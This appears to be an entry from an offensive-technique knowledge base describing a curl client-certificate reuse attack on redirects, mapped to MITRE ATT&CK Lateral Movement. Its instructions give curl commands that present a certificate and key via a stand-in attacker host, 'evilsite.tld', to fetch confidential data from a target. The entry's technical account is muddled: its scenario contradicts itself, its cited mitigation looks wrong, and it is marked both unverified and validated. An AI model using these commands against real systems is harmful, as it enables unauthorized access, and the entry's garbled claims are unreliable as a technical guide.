---
id: proc-uuid-004
name: Execute-Curl-with-Certificate-Reuse
tags:
  - curl
  - execute
  - exploit
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/curl-follow-redirect-with-cert]]'
verified: false
platforms:
  - Linux
  - Windows
  - macOS
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Private Keys]]'
updated_at: '2025-12-14T17:30:58.726Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Private Keys]]'
---
# Execute-Curl-with-Certificate-Reuse

## Summary

This procedure executes a curl command to follow an attacker-controlled redirect while providing client certificate and key, demonstrating reuse for unauthorized access to the target.

## Description

Curl's libcurl reuses the client cert for subsequent TLS connections during redirects, even across different hosts. This allows the attacker to control where the victim's cert is presented. The command targets the redirect site, follows to target, and fetches protected content without host restrictions.

## Requirements

1. client.crt and client.key files prepared
2. Network access to evilsite.tld and targetsite.tld
3. Curl installed with TLS support

## Defense

Defensive measures and detection strategies:

- Patch curl to version 7.77.0+ where this is mitigated (CURLOPT_SSL_VERIFYHOST)
- Configure apps to clear auth on cross-host redirects
- Proxy requests to strip or validate redirects

## Objectives

1. Trigger certificate reuse on redirect
2. Access protected resource
3. Retrieve confidential data

## Instructions

### Step 1: Run Curl Command

**Context**: Execute the attack command to follow redirect with cert.

Execute [[commands/curl-follow-redirect-with-cert]]:

```bash
curl -L --cert client.crt --key client.key https://evilsite.tld/something
```

> Follows redirect (-L), uses cert (--cert) and key (--key) for TLS auth. Expected output: secretfile content displayed, indicating successful reuse.

### Step 2: Verify Authentication

**Context**: Check if cert was applied to target.

Inspect output for target content; use -v for verbose TLS details.

```bash
curl -v -L --cert client.crt --key client.key https://evilsite.tld/something
```

> Shows TLS handshake with cert on target host.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Private Keys]] Private Keys

### Sub-Techniques


## Commands Used

- [[commands/curl-follow-redirect-with-cert]]

## Tools Used

- [[tools/curl]]

## Tags

- curl
- execute
- exploit
